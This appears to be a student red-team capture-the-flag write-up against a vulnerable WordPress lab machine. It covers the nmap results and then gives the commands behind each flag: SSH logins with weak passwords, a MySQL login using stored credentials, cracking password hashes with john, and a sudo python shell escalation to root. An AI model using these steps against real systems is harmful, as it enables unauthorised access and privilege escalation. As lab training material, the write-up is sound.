# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:
![NMAP_110](https://user-images.githubusercontent.com/88590862/145342557-62680bb4-a41f-4420-9fa3-4523293dff36.PNG)


$ nmap #192.168.1.110
  

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp SSH
  - 80/tcp http
  - 111/tcp rpcbind
  - 139/tcp netbios-ssn
  - 445/tcp microsoft-ds
  
The following vulnerabilities were identified on each target:
- Target 1
  - WordPress XML-RPC Username/Password Login Scanner
    - CVE-1999-0502
  - WordPress Pingback Locator
    - CVE-2013-0235
  - Cron WordPress Attacks
  

### Exploitation


The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
  
  ![wps_scan](https://user-images.githubusercontent.com/88590862/145343295-5365d4c8-fb31-4ebe-a658-993ad4558d0e.PNG)
  
  ![wps_scan_results](https://user-images.githubusercontent.com/88590862/145343306-8ef5e4ef-cea3-4398-81c2-044ef152ba72.PNG)
  
  ![SSH_michael](https://user-images.githubusercontent.com/88590862/145343326-e1e934aa-2401-47ea-b5b5-e2d7a605e4ad.PNG)

  ![where_to_find_flag1](https://user-images.githubusercontent.com/88590862/145342868-8b33ce00-ae83-4e3d-b98d-70795dff48b0.PNG)
  
  ![flag1](https://user-images.githubusercontent.com/88590862/145342878-b438b8f8-f4df-415f-96a5-f8dae8b1fc9b.PNG)

    - **Exploit Used**
      - Open Port 22 SSH with weak password
      - ssh michael@192.168.1.110 
        - password: michael
  
  
- `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
  
  ![flag2](https://user-images.githubusercontent.com/88590862/145343466-e46aff47-7137-4db4-b9e4-b2eeea5aba11.PNG)

    - **Exploit Used**
      - Open Port 22 SSH with weak password
      - ssh michael@192.168.1.110 
        - password: michael
    
    
- `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
  
  ![launching_mysql](https://user-images.githubusercontent.com/88590862/145343714-3bbc986f-ab42-43ac-b265-3aabb4cd3ae1.PNG)
  
  ![login_to_wordpress](https://user-images.githubusercontent.com/88590862/145343726-67824d17-6331-4c48-b0a5-afd13cfd116d.PNG)
  
  ![how_to_find_flag3](https://user-images.githubusercontent.com/88590862/145344202-25d0a22b-5b50-4348-8be5-62c3b6073161.PNG)

  ![flag3](https://user-images.githubusercontent.com/88590862/145343912-7e3d14f8-58f5-4932-8bd9-519172c6be4a.PNG)

    - **Exploit Used**
      - WordPress Configuration, SQL Database
      - mysql -h localhost -u root -p wordpress
        - password: R@v3nSecurity
      - mysql> SELECT * FROM wp_posts;
    
    
- `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
  
  ![mysql_users](https://user-images.githubusercontent.com/88590862/145344444-5aad98f8-9bff-4360-a39e-33ff6b20e037.PNG)

  ![john_results](https://user-images.githubusercontent.com/88590862/145344486-392d3eeb-16fe-44f1-b5ec-91fd701d48f8.PNG)

  ![finding_how_to_run_sudo](https://user-images.githubusercontent.com/88590862/145344544-23d0631e-4211-425a-ab12-91a851d58218.PNG)

  ![escalate_root_python](https://user-images.githubusercontent.com/88590862/145344559-0cf8b073-dd50-47e5-9c91-c727fddd753e.PNG)

  ![flag4](https://user-images.githubusercontent.com/88590862/145344600-90a052c4-61f6-418d-b4da-c04e644c8c8d.PNG)

    - **Exploit Used**
      - Privilege escalation
      - mysql> use wp_users
        - create wp_hashes.txt with users and hashes
          - root@Kali:~# john wp_hashes.txt
      - ssh steven@192.168.1.110
        - password: pink84
          - find out what sudo privilege Steven has: sudo -l
          - escalate to root:
            - sudo python -c 'import pty;pty.spawn("/bin/bash")'
  
